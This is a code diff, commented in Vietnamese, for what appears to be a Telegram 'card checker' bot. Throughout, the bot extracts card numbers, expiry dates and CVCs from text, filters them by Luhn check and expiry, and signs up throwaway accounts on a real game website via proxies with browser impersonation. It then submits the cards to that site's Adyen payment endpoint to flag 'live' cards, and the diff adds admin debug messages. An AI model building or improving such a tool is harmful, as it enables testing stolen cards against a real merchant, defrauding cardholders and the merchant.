@@ -292,6 +292,8 @@ def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, do
 # ===================================================================
 
 def normalize_card(card_str):
+    # Cập nhật Regex chặt chẽ hơn: chỉ chấp nhận phân cách | / : ; - hoặc khoảng trắng
+    # Tránh bắt nhầm các đoạn text khác
     pattern = r'(\d{13,19})[\s|/;:.-]+(\d{1,2})[\s|/;:.-]+(\d{2,4})[\s|/;:.-]+(\d{3,4})'
     match = re.search(pattern, card_str)
     
@@ -310,6 +312,7 @@ def normalize_card(card_str):
     if len(year) == 2: year = '20' + year
     try:
         year_int = int(year)
+        # Bỏ giới hạn dưới cứng ở đây để cho phép bộ lọc tùy chỉnh xử lý
         if year_int > 2040: 
             return None
     except ValueError: return None
@@ -322,12 +325,17 @@ def extract_cards_from_text(text):
     valid_cards = []
     seen = set()
     
+    # Xử lý từng dòng để tránh Regex ăn lan từ dòng này sang dòng kia
     lines = text.splitlines()
+    
+    # Regex chặt chẽ: Card + (Separators) + Month + ...
+    # [\s|/;:.-]+ nghĩa là 1 hoặc nhiều ký tự phân cách (space, |, /, :, ;, ., -)
     pattern_strict = r'(\d{13,19})[\s|/;:.-]+(\d{1,2})[\s|/;:.-]+(\d{2,4})[\s|/;:.-]+(\d{3,4})'
     
     for line in lines:
         matches = re.findall(pattern_strict, line)
         for m in matches:
+            # Tạo chuỗi tạm để normalize kiểm tra lại logic ngày tháng
             temp_str = f"{m[0]}|{m[1]}|{m[2]}|{m[3]}"
             normalized = normalize_card(temp_str)
             if normalized and normalized not in seen:
@@ -379,6 +387,7 @@ def generate_dadus():
     return base64.b64encode(json_string.encode('utf-8')).decode('utf-8')
 
 def generate_progress_bar(current, total, length=15):
+    """Tạo thanh loading bar text"""
     if total == 0: return ""
     percent = current / total
     filled_length = int(length * percent)
@@ -387,6 +396,11 @@ def generate_progress_bar(current, total, length=15):
 
 # --- HÀM LỌC FILE NÂNG CAO ---
 def filter_invalid_cards(card_list):
+    """
+    Lọc thẻ trước khi check:
+    1. Luhn sai -> Loại
+    2. Năm <= 2025 -> Loại
+    """
     valid_list = []
     removed_count = 0
     
@@ -436,7 +450,10 @@ async def get_bin_info(session, cc_num):
     except Exception:
         return "BIN ERROR"
 
-async def check_card_core(line, session_semaphore=None):
+async def check_card_core(line, user_id, session_semaphore=None):
+    """
+    Updated: Thêm tham số user_id để phân quyền debug
+    """
     global CURRENT_OFFER_INDEX
     
     current_config = OFFER_MAP.get(CURRENT_OFFER_INDEX, OFFER_MAP[1])
@@ -465,22 +482,23 @@ async def check_card_core(line, session_semaphore=None):
 
     if session_semaphore:
         async with session_semaphore:
-            return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id)
+            # Chỉ bắt đầu tính giờ bên trong _execute_check
+            return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, user_id)
     else:
-        return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id)
+        return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, user_id)
 
-async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id):
+async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, user_id):
+    # --- [IMPROVED TIME CHECK] ---
+    # Bắt đầu tính giờ tại đây (khi thread thực sự chạy)
     start_time = time.time()
     
     retry_count = 0
     max_retries = 20
     impersonate_ver = "chrome120"
     
-    # --- DEBUG VARIABLES ---
-    last_debug_err = "None"
-    last_debug_code = "N/A"
-    last_debug_body = "N/A"
-    
+    # Biến lưu debug cho Admin
+    last_debug_info = None
+
     while retry_count < max_retries:
         try:
             async with AsyncSession(impersonate=impersonate_ver, proxies=PROXIES_CONFIG, verify=False) as session:
@@ -488,9 +506,9 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id):
                 reg_headers = {'accept': '*/*', 'referer': 'https://taongafarm.com/en/'}
                 resp_token = await session.get('https://taongafarm.com/api/token.js', headers=reg_headers, timeout=15)
                 
-                # Update debug info
-                last_debug_code = resp_token.status_code
-                
+                if resp_token.status_code != 200 and user_id == ADMIN_ID:
+                    last_debug_info = f"STEP 1 ERROR\nStatus: {resp_token.status_code}\nBody: {resp_token.text[:3000]}"
+
                 match = re.search(r"window\.csrftoken='([^']+)'", resp_token.text)
                 if not match:
                     retry_count += 1
@@ -514,9 +532,9 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id):
                 
                 resp_reg = await session.post('https://taongafarm.com/api/login/signup', headers=api_headers, json=reg_data, timeout=15)
                 
-                # Update debug info
-                last_debug_code = resp_reg.status_code
-                
+                if resp_reg.status_code != 200 and user_id == ADMIN_ID:
+                    last_debug_info = f"STEP 2 ERROR\nStatus: {resp_reg.status_code}\nBody: {resp_reg.text[:3000]}"
+
                 if 'session_portal' not in session.cookies.get_dict():
                     retry_count += 1
                     continue
@@ -558,10 +576,6 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id):
 
                 resp_pay = await session.post('https://taongafarm.com/payment/adyen/api/checkout/payment', headers=payment_headers, json=payment_json_data, timeout=20)
                 
-                # Update debug info (Crucial for Admin)
-                last_debug_code = resp_pay.status_code
-                last_debug_body = resp_pay.text
-
                 # === XỬ LÝ LỖI 500 ===
                 if resp_pay.status_code == 500:
                     end_time = time.time()
@@ -570,13 +584,22 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id):
                         "status": "DECLINED",
                         "is_live": False,
                         "full_log": f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|500|Card Not Supported - Time: {time_taken}s",
-                        "bin_info": "UNK",
-                        "debug_info": {"status_code": 500, "body": last_debug_body, "error": "Internal Server Error"}
+                        "bin_info": "UNK"
                     }
+                
+                # --- NẾU LỖI HTTP KHÁC 200 MÀ KHÔNG PHẢI 500 ---
+                if resp_pay.status_code != 200:
+                    if user_id == ADMIN_ID:
+                        # Lưu lại response text để gửi cho admin nếu cần
+                        last_debug_info = f"PAYMENT ERROR\nStatus: {resp_pay.status_code}\nBody: {resp_pay.text[:3000]}"
+                    retry_count += 1
+                    continue
 
                 try:
                     data = resp_pay.json()
                 except:
+                    if user_id == ADMIN_ID:
+                        last_debug_info = f"JSON ERROR\nStatus: {resp_pay.status_code}\nBody: {resp_pay.text[:3000]}"
                     retry_count += 1
                     continue
 
@@ -617,24 +640,28 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id):
                 }
 
         except Exception as e:
-            last_debug_err = str(e)
+            if user_id == ADMIN_ID:
+                last_debug_info = f"EXCEPTION: {str(e)}"
             retry_count += 1
             await asyncio.sleep(0.5)
             continue
     
-    # --- [IMPROVED TIME CHECK & DEBUG RETURN] ---
+    # --- [IMPROVED TIME CHECK] ---
+    # Tính thời gian ngay cả khi lỗi timeout để biết proxy chậm thế nào
     end_time = time.time()
     time_taken = round(end_time - start_time, 2)
-    return {
-        "status": "ERROR", 
-        "is_live": False, 
-        "full_log": f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|Timeout or Network Error - Time: {time_taken}s",
-        "debug_info": {
-            "status_code": last_debug_code,
-            "body": last_debug_body,
-            "error": last_debug_err
-        }
+    
+    error_response = {
+        "status": "ERROR",
+        "is_live": False,
+        "full_log": f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|Timeout or Network Error - Time: {time_taken}s"
     }
+    
+    # Nếu là Admin và có debug info, đính kèm vào kết quả trả về
+    if user_id == ADMIN_ID and last_debug_info:
+        error_response["admin_debug"] = last_debug_info
+        
+    return error_response
 
 # ===================================================================
 # === PHẦN 4: LOGIC XỬ LÝ HÀNG LOẠT (NON-BLOCKING)
@@ -655,6 +682,7 @@ async def process_card_list(update: Update, context: ContextTypes.DEFAULT_TYPE, 
     Hàm xử lý chạy ngầm, không block main thread
     """
     global CURRENT_OFFER_INDEX
+    user_id = update.effective_user.id
     
     total_cards = len(card_list)
     if total_cards == 0:
@@ -719,7 +747,7 @@ async def process_card_list(update: Update, context: ContextTypes.DEFAULT_TYPE, 
     ui_task = asyncio.create_task(update_ui_loop())
 
     async def worker(line):
-        res = await check_card_core(line, session_semaphore=semaphore)
+        res = await check_card_core(line, user_id, session_semaphore=semaphore)
         stats.checked += 1
         
         # BÁO LIVE TỨC THÌ
@@ -733,6 +761,17 @@ async def process_card_list(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                 )
                 await context.bot.send_message(chat_id=chat_id, text=msg_live)
             except: pass
+        
+        # --- BÁO DEBUG CHO ADMIN NẾU LỖI ---
+        if res["status"] == "ERROR" and user_id == ADMIN_ID and "admin_debug" in res:
+             try:
+                # Gửi full log (cắt ngắn 3500 ký tự để tránh lỗi Telegram)
+                debug_text = res["admin_debug"]
+                msg_debug = f"⚠️ **DEBUG INFO (ADMIN)**\nCard: `{line}`\n\n{debug_text}"
+                if len(msg_debug) > 3500:
+                    msg_debug = msg_debug[:3500] + "...(truncated)"
+                await context.bot.send_message(chat_id=chat_id, text=msg_debug)
+             except: pass
 
         async with file_lock:
             if res["is_live"]:
@@ -858,9 +897,9 @@ async def single_check_command(update: Update, context: ContextTypes.DEFAULT_TYP
             await update.message.reply_text("⚠️ Không tìm thấy thẻ hoặc sai định dạng.")
             return
 
+        user_id = update.effective_user.id
         current_config = OFFER_MAP.get(CURRENT_OFFER_INDEX)
         card_data = cards[0]
-        user_id = update.effective_user.id
         
         # Gửi tin nhắn chờ (để user biết bot đã nhận lệnh)
         msg = await update.message.reply_text(f"⏳ Đang check: {card_data}\n💰 Mode: {current_config['price']}$")
@@ -869,8 +908,9 @@ async def single_check_command(update: Update, context: ContextTypes.DEFAULT_TYP
         # Đưa việc check vào task ngầm để bot lập tức rảnh tay nhận lệnh khác
         async def run_check():
             try:
-                result = await check_card_core(card_data)
+                result = await check_card_core(card_data, user_id)
                 
+                # --- XỬ LÝ KẾT QUẢ HIỂN THỊ ---
                 if "full_log" in result and "bin_info" in result:
                      base_log = result['full_log'].split(" - [")[0]
                      bin_info = result['bin_info']
@@ -881,22 +921,18 @@ async def single_check_command(update: Update, context: ContextTypes.DEFAULT_TYP
                                           f"🏦 Bin: {bin_info}\n" \
                                           f"💰 Charge: {current_config['price']}$\n" \
                                           f"⏱ {time_str}"
-                     
-                     # --- ADMIN DEBUG FOR ERROR ---
-                     if result["status"] == "ERROR" and user_id == ADMIN_ID and "debug_info" in result:
-                         debug = result["debug_info"]
-                         debug_msg = f"\n\n👨‍💻 **ADMIN DEBUG (TIMEOUT/NET):**\n" \
-                                     f"📡 Status Code: `{debug.get('status_code', 'N/A')}`\n" \
-                                     f"❌ Exception: `{debug.get('error', 'N/A')}`\n" \
-                                     f"📄 Response Body (Last 3000 chars):\n" \
-                                     f"```html\n{str(debug.get('body', 'N/A'))[-3000:]}\n```"
-                         formatted_response += debug_msg
                 else:
                      formatted_response = result['full_log']
+                
+                # Nếu có lỗi và là Admin thì đính kèm debug info
+                if result['status'] == "ERROR" and user_id == ADMIN_ID and "admin_debug" in result:
+                    debug_text = result["admin_debug"]
+                    if len(debug_text) > 2000: debug_text = debug_text[:2000] + "..."
+                    formatted_response += f"\n\n⚠️ **DEBUG:**\n{debug_text}"
 
                 await msg.edit_text(formatted_response)
             except Exception as e:
-                await msg.edit_text(f"❌ Lỗi Bot: {str(e)}")
+                await msg.edit_text(f"❌ Lỗi: {str(e)}")
 
         # Chạy task không chờ đợi (Non-blocking)
         asyncio.create_task(run_check())
